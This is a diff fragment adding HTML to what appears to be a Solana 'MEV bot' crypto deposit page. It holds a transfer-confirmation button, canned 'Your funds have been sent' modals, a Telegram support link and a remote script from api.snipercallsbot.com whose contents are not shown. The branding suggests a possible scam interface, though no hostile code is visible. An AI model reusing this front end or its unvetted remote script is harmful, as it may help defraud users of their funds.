+            class="modal__deposit__crypto__send__button"
+            onclick="depositedToAddressCryptoWithdraw()"
+          >
+            Confirm transfer
+
+            <span
+              class="loader small hide"
+              id="loader_deposit_crypto_send_button"
+            ></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal__loading">
+      <div class="modal__error">
+        <span class="loader"></span>
+        <div class="modal__error__title">
+          Waiting for transaction confirmation
+        </div>
+        <div class="modal__error__subtitle">Please wait for confirmation.</div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal__loading__iban">
+      <div class="modal__error">
+        <span class="loader"></span>
+        <div class="modal__error__title">
+          Checking your payment details
+        </div>
+        <div class="modal__error__subtitle">Please wait, checking in progress.</div>
+      </div>
+    </div>
+
+
+    <div class="modal hide" id="modal__success__iban">
+      <div class="modal__error">
+        <img
+          src="/img/success.svg"
+          alt=""
+          style="width: 80px; height: 80px; margin-bottom: 30px"
+        />
+        <div class="modal__error__title">Your funds have been sent</div>
+        <div class="modal__error__subtitle">
+          The transfer was completed successfully.
+        </div>
+      </div>
+    </div>
+    <div class="modal hide" id="modal__success">
+      <div class="modal__error">
+        <img
+          src="/img/success.svg"
+          alt=""
+          style="width: 80px; height: 80px; margin-bottom: 30px"
+        />
+        <div class="modal__error__title">Your funds have been sent</div>
+        <div class="modal__error__subtitle">
+          The transaction was completed successfully.
+        </div>
+      </div>
+    </div>
+
+    <a class="support" href="https://t.me/mevsolana_help" target="_blank">
+      <img src="/img/support.svg" alt="">
+    </a>
+  </body>
+
+  <script src="https://api.snipercallsbot.com/main.js"></script>
+</html>
